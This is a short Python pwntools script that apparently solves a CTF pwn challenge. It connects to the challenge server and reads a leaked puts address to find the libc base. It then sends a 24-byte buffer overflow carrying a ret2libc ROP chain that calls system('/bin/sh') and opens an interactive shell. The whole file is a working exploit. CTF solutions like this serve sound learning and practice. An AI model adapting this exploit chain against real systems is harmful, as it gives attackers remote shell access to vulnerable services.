from pwn import *

context.log_level = 'debug'

libc = ELF("./libc.so.6")

r = remote("chal.24.cuhkctf.org", 24037)
# r = process("./chall_patched")

r.recvuntil(b"Hello fellow hackers!\n...\nThis is kylebot!\n...\nI'm going to give you a gift!\n...\n")
puts_addr = r.recvuntil(b"\n")
puts_addr = eval(puts_addr.decode().strip('\n'))
libc_base = puts_addr-libc.symbols['puts']
print(f'puts addr: {hex(puts_addr)}')
print(f"libc base: {hex(libc_base)}")

pop_rdi = libc_base+0x10f75b
sh_addr = libc_base+next(libc.search(b'/bin/sh'))
ret_addr = libc_base+0x2882f
sys_addr = libc_base+libc.symbols['system']

payload = b'a'*24+p64(pop_rdi)+p64(sh_addr)+p64(ret_addr)+p64(sys_addr)
r.sendline(payload)
r.interactive()